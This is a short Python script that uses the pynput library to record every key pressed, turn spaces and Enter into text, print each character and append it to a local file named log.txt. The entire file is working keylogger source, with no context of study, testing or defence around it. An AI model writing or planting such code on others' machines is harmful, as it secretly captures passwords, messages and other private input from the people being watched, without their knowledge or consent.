from pynput.keyboard import Listener

def writefile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.backspace':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    print(letter)
    with open("log.txt", "a") as f:
        f.write(letter)

with Listener(on_press=writefile) as l:
    l.join()